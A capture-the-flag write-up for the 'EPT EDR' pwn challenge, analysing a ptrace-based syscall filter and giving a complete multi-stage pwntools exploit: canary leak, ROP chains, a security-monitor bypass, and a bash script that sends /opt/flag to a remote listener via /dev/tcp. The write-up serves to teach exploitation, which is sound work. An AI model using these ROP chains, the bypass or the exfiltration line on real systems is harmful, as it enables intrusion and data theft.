# pwn / EPT EDR
by *Kosehai* for *Rumble In The Jungle*
---

I spent a lot of time looking at this challenge during the CTF, but sadly i was stuck going down the wrong rabbit hole and did not end up solving it. I decided to finish it up the next day with a fresh mindset. This challenge was very creative and forced you to think very differently compared to normal ROP chals.

## Challenge description
We are sick of wack EDR solutions, so we have created our very own EPT EDR for linux. The EDR will make sure that the target process only executes allowed syscalls. If it tries anything else, it will be killed.

There is also a DLP solution included that will stop any attemps of sensitive data exfil. 

For a proper test of the EDR, we are running the process_monitor from the procmon challenge. But this time its protected by our very own EPT EDR. Can you still get the flag?

---

We are provided with the ept_edr binary and the same binary from the Process Monitor chall.

## Binary analysis

### process_monitor
I won't go into Process Monitor since it was part of another challenge, but tldr it allows you to read /proc/{pid}/maps of any binary running on the system, and has a clean BOF with as large of a ROP as you want.

### ept_edr
The edr binary run independently of process_monitor, when it spins up it goes into an infinite loop looking for pids to monitor. After it finds a PID to monitor it attaches to it with PTRACE.

What's important is that it also forks before it attaches. When a process forks the memory layout remains identical to the parent. This means that where memory is mapped in the binary will never change. Even if you crash the child process you can just reconnect and you will have a new child with the exact same memory layout.

This also has the side effect that the canary value will never change in any of the forks. So if you leak the canary then instantly crash you can reconnect and have a new process with the same canary value.

After we have attached to process we also open up a logfile we write some events to.

Ptrace is one of the more complex system calls in linux. I won't get into details but ptrace is effectively what debuggers use to monitor processes. In the case of ept_edr it is used to inspect all syscalls made from the tracee.

In the end the binary does not do that much. If we filter out all the ptrace boilerplate code it boils down to these three functions:
* is_syscall_allowed
* validate_read_data
* validate_file_name

#### is_syscall_allowed
```c
bool __cdecl is_syscall_allowed(int syscall_no)
{
  size_t i; // [rsp+Ch] [rbp-8h]

  for ( i = 0LL; i < 0xF; ++i )
  {
    if ( syscall_no == allowed_syscalls[i] )
      return 1;
  }
  return 0;
}
```
This function is pretty simple. It inspect the RAX value of our syscall and checks if we are allowed to perform it. We are allowed to perform 15 diffrent syscalls, i suspect a lot of these are added to just keep the original binary working.

```c
allowed_syscalls dd 0, 1, 2, 3Ch, 106h, 0D9h, 3, 101h, 13Eh, 50h, 0Ch, 20h, 21h, 48h, 0FFFFFFFF
aRead           db 'read',0             
aWrite          db 'write',0            
aOpen           db 'open',0             
aClose          db 'close',0            
aBrk            db 'brk',0              
aDup            db 'dup',0              
aDup2           db 'dup2',0             
aExit_0         db 'exit',0             
aFcntl          db 'fcntl',0            
aChdir          db 'chdir',0            
aGetdents64     db 'getdents64',0       
aOpenat         db 'openat',0           
aNewfstatat     db 'newfstatat',0       
aGetrandom      db 'getrandom',0        
```

#### validate_file_name
```c
void __cdecl validate_file_name(FILE *log_file, pid_t target_pid, user_regs_struct regs)
{
  int null_byte_position; // [rsp+14h] [rbp-12Ch] BYREF
  __int64 wait_status; // [rsp+18h] [rbp-128h] BYREF
  __int64 i; // [rsp+20h] [rbp-120h]
  __int64 buffer_addr; // [rsp+28h] [rbp-118h]
  char read_data_buffer[257]; // [rsp+30h] [rbp-110h] BYREF
  unsigned __int64 v8; // [rsp+138h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  memset(read_data_buffer, 0, sizeof(read_data_buffer));
  buffer_addr = regs.rsi;
  for ( i = 0LL; ; i += 8LL )
  {
    wait_status = ptrace(__ptrace_request::PTRACE_PEEKDATA, (unsigned int)target_pid, i + buffer_addr, 0LL);
    if ( contains_null_byte(wait_status, &null_byte_position) )
      break;
    *(_QWORD *)&read_data_buffer[i] = wait_status;
  }
  memcpy(&read_data_buffer[i], &wait_status, null_byte_position);
  if ( strstr(read_data_buffer, "flag") )
  {
    fprintf(log_file, "[-]DLP failre, someone tried to open %s\n", read_data_buffer);
    fflush(log_file);
    kill(target_pid, 9);
    LODWORD(wait_status) = 0;
    waitpid(target_pid, (int *)&wait_status, 0);
    if ( ptrace(__ptrace_request::PTRACE_DETACH, (unsigned int)target_pid, 0LL, 0LL) == -1 )
    {
      perror("ptrace detach");
      exit(1);
    }
  }
}
```
This function inspects the rsi pointer of open/openat syscalls, and checks that the substring "flag" does not exist. If it finds the substring it writes an event to log and kills there process.

This is where we find our first bug.

```c
  memcpy(&read_data_buffer[i], &wait_status, null_byte_position);
  if ( strstr(read_data_buffer, "flag") )
  {
    fprintf(log_file, "[-]DLP failre, someone tried to open %s\n", read_data_buffer);
```

No length validation is being made to the size of the string in our open syscall. This means we can overflow 257 byte buffer and write all the way down to our stack canary.

The contains_null_byte() function is even so kind to count up to the first nullbyte and not include it in the memcpy. This means if we provide a string with 264 bytes to open, and it contains the substr "flag" the fprintf will print the canary value to the syscall.log file.

### validate_read_data
```c
void __cdecl validate_read_data(FILE *log_file, pid_t target_pid, user_regs_struct regs)
{
  __int64 wait_status; // [rsp+18h] [rbp-428h] BYREF
  __int64 i; // [rsp+20h] [rbp-420h]
  __int64 buffer_addr; // [rsp+28h] [rbp-418h]
  char read_data_buffer[1024]; // [rsp+30h] [rbp-410h] BYREF
  unsigned __int64 v7; // [rsp+438h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  buffer_addr = regs.rsi;
  for ( i = 0LL; (unsigned __int64)SLODWORD(regs.rax) >> 3 >= i; ++i )
  {
    wait_status = ptrace(__ptrace_request::PTRACE_PEEKDATA, (unsigned int)target_pid, buffer_addr + 8 * i);
    *(_QWORD *)&read_data_buffer[8 * i] = wait_status;
  }
  read_data_buffer[SLODWORD(regs.rax)] = 0;
  if ( DLP_checker(read_data_buffer, SLODWORD(regs.rax)) )
  {
    fwrite("[-] found DPL content in data, killing!\n", 1uLL, 0x28uLL, log_file);
    kill(target_pid, 9);
    LODWORD(wait_status) = 0;
    waitpid(target_pid, (int *)&wait_status, 0);
    if ( ptrace(__ptrace_request::PTRACE_DETACH, (unsigned int)target_pid, 0LL, 0LL) == -1 )
    {
      perror("ptrace detach");
      exit(1);
    }
  }
}
```

This function inspects the data of read after it is complete. It then goes on to run the regex `EPT\\{[^}]+\\}` on it to make sure it does not contains the flag. This is where we find our next bug.

```c
 for ( i = 0LL; (unsigned __int64)SLODWORD(regs.rax) >> 3 >= i; ++i )
  {
    wait_status = ptrace(__ptrace_request::PTRACE_PEEKDATA, (unsigned int)target_pid, buffer_addr + 8 * i);
    *(_QWORD *)&read_data_buffer[8 * i] = wait_status;
  }
```

This for-loop does not really decompile properly and looks very cursed, but what it does is that it inspects the return value of read in the rax register. It then goes on to copy one and one byte into a 1024 buffer. There is no bound check so we get a clean buffer overflow.

## Exploitation
There is a lot of moving parts to this chall so to abstract it up a bit i divided the exploit up into 4 stages.

1. Do overflow in verify_file_name to leak the canary value into the syscall.log file
2. Read out the syscall.log file and write it to the console.
3. Write a bash script to disk so we can execve it from a ROP in ept_edr.
4. Do overflow in ept_edr with the previously leaked canary value and chmod our bash script and execute it.

The reason i opted to go for a bash script instead of just popping a shell is that we don't really have any way to i/o with the edr process.

#### Stage 1 - Making the leak
```py
def stage1():
    global io
    io = conn()
    io.recv()
    pmon = procdump(b"process_monitor")

    exe.address = get_base(pmon, b"/process_monitor")
    libc_addr = get_base(pmon, b"libc")
    libc.address = libc_addr
    info("Libc: " + hex(libc.address))
    info("exe: " + hex(exe.address))
    rop = ROP(libc)
    rop.read(0, exe.bss(), 300)
    rop.open(exe.bss(), 0)
    rop.call(exe.sym.main)

    payload = flat(
        cyclic(offset),
        rop.chain()
    )
    io.sendline(b"2")
    io.sendline(payload)
    io.sendline(b"flag" + b"A"*(252) + b"DEADBEEF")
    io.close()
```

Here we perform the overflow in process monitor, and in the our ropchain we read 300 bytes into the bss of our program. Then we perform open with the string we read into bss as our argument. This will trigger the buffer overflow and log the canary aslong as our string contains the work "flag". We include "DEADBEEF" so it's easier to search in the output later. We chose the bss segment as our write target cause it is always gonne be writable memory.

#### Stage 2 - Getting our leak
```py
def stage2():
    global io
    io = conn()
    io.recv()
    pmon = procdump(b"process_monitor")
    exe.address = get_base(pmon, b"/process_monitor")
    libc_addr = get_base(pmon, b"libc")
    libc.address = libc_addr
    info("Libc: " + hex(libc.address))
    info("exe: " + hex(exe.address))

    rop = ROP(libc)
    rop.read(0, exe.bss(), 32)
    rop.open(exe.bss(), 0)
    rop.read(fd, exe.bss(), 1024)
    rop.write(1, exe.bss(), 1024)
    rop.exit(0)

    payload = flat(
        cyclic(offset),
        rop.chain()
    )
    io.sendline(b"2")
    io.sendline(payload)
    io.sendline(b"syscall.log\x00")
    io.recvuntil(b"DEADBEEF\n")
    canary = io.recv(7)
    canary = b"\x00" + canary
    canary = u64(canary)
    info("Canary: " + hex(canary))
    io.close()
    return canary
```

Here we do something similar, but this time we read the string `syscall.log\x00` into the bss segment. Then we perform open on the string we just read in and read 1024 bytes from the file. After its done reading we write the content of the file to the terminal so we can receive our canary leak.

We can't really read more then 1024 bytes since it will trigger the second overflow and crash edr which would also terminate our process_monitor before we could write out the data.

#### Stage 3 - Preparing our payload
```py
def stage3():
    global io
    io = conn()
    io.recv()
    pmon = procdump(b"process_monitor")
    exe.address = get_base(pmon, b"/process_monitor")
    libc_addr = get_base(pmon, b"libc")

    libc.address = libc_addr
    info("Libc: " + hex(libc.address))
    info("exe: " + hex(exe.address))
    bash_code = f"#!/bin/bash\ncat /opt/flag > /dev/tcp/{REV_IP}/{REV_PORT}".encode()
    filename = next(libc.search(b"./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\x00"))
    rop = ROP(libc)
    rop.read(0, exe.bss(), len(bash_code))
    rop.open(filename, 66) #O_CREAT|O_RDWR
    rop.write(fd, exe.bss(), len(bash_code))
    rop.close(fd)
    rop.exit(0)

    payload = flat(
        cyclic(offset),
        rop.chain()
    )
    
    io.sendline(b"2")
    io.sendline(payload)
    io.send(bash_code)
    io.close()
```

Here we do the inverse of Stage 2. We read some file data into bss, then we write it to file. We choose `./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz` as our filename cause it satisfies these requirements:
* It is a string that exists within LIBC.
* It starts with `./` (This is required for execve)
* It ends with a nullbyte

We don't have a way to directly read data into the edr process. We could create a string with ROP but it would add a lot of complexity to the ROP chain.

The bash payload we provide reads the content of /opt/flag into /dev/tcp, sending it to our internet facing netcat listener. We need to make sure it has a shebang line so we can run it with execve.

#### Stage 4 - Executing our payload
```py
def stage4(canary):
    global io
    io = conn()
    io.recv()
    pmon = procdump(b"process_monitor")
    edr = procdump(b"edr")
    exe.address = get_base(pmon, b"/process_monitor")
    libc_addr = get_base(pmon, b"libc")
    libc2_addr = get_base(edr, b"libc")

    libc.address = libc_addr

    rop = ROP(libc)
    rop.read(0, exe.bss(), 2048)
    rop.open(exe.bss(), 0)

    payload = flat(
        cyclic(offset),
        rop.chain()
    )

    libc.address = libc2_addr
    rop2 = ROP(libc)
    rop2.chmod(next(libc.search(b"./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\x00")), 0o777)
    rop2.execve(next(libc.search(b"./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\x00")), 0, 0)
    
    io.sendline(b"2")
    io.sendline(payload)
    io.send(cyclic(1024+8) + p64(canary) + b"AAAAAAAA" + rop2.chain())
```

Now that everything is in place all we have to do is prepare the final ROP. Notice how we leak the libc base for the edr process here aswell, and prepare two rop chains.

The final ropchain in edr is pretty simple. All we have to do is chmod our file so it's executable and execve it.

#### Putting it all together
```bash
[+] Opening connection to io.ept.gg on port 59589: Done
[*] Libc: 0x7faf3afa2000
[*] exe: 0x556dbe2a7000
[*] Loaded 219 cached gadgets for './libc.so.6'
[*] Closed connection to io.ept.gg port 59589
[*] Stage 1 done
[+] Opening connection to io.ept.gg on port 59589: Done
[*] Libc: 0x7f6284339000
[*] exe: 0x558e1be83000
[*] Canary: 0xfd91d2d128ffb200
[*] Closed connection to io.ept.gg port 59589
[*] Stage 2 done
[+] Opening connection to io.ept.gg on port 59589: Done
[*] Libc: 0x7f18f9c37000
[*] exe: 0x562b1d7cb000
[*] Closed connection to io.ept.gg port 59589
[*] Stage 3 done
[+] Opening connection to io.ept.gg on port 59589: Done
[*] Stage 4 check your nc
[*] Switching to interactive mode

1. List all running processes
2. Get details for a given process
3. Exit
Enter your choice: Enter the PID of the process: [*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to io.ept.gg port 59589
```
Looking at the solve output it looks like nothing happened, but when we check our nc listener we got our flag!
```bash
listening on [any] 55973 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [xx.xx.xx.xx] 46608
EPT{0ur_3dr_1s_b3st_3dr}
```
### Cheese

There is one more bug i did not talk about. I mentioned that the validate_file_name function inspected the pointer in rsi to confirm we did not open the flag. This is correct for openat but if we look at the syscall definitions for openat and open:
```
int open(const char *pathname, int flags);
int openat(int dirfd, const char *pathname, int flags);
```

We can see that pathname is in rsi for openat, but for open the "flags" variable is passed in rsi. So when you do a normal open syscall edr runs strstr on NULL which is fine and won't crash. If you call open from libc it uses openat internally, so you have to use the "syscall" function.

This payload also gets you the flag without touching the edr process:
```py
def cheese():
    global io
    io = conn()
    io.recv()
    pmon = procdump(b"process_monitor")

    exe.address = get_base(pmon, b"/process_monitor")
    libc_addr = get_base(pmon, b"libc")
    libc.address = libc_addr
    info("Libc: " + hex(libc.address))
    info("exe: " + hex(exe.address))
    rop = ROP(libc)
    rop.read(0, exe.bss(), 16)
    rop.call(libc.sym.syscall, [2, exe.bss(), 0])
    rop.read(5, exe.bss(), 32)
    rop.write(1, exe.bss(), 32)

    payload = flat(
        cyclic(offset),
        rop.chain()
    )
    io.sendline(b"2")
    io.sendline(payload)
    io.send(b"/opt/flag\x00")
    io.interactive()
```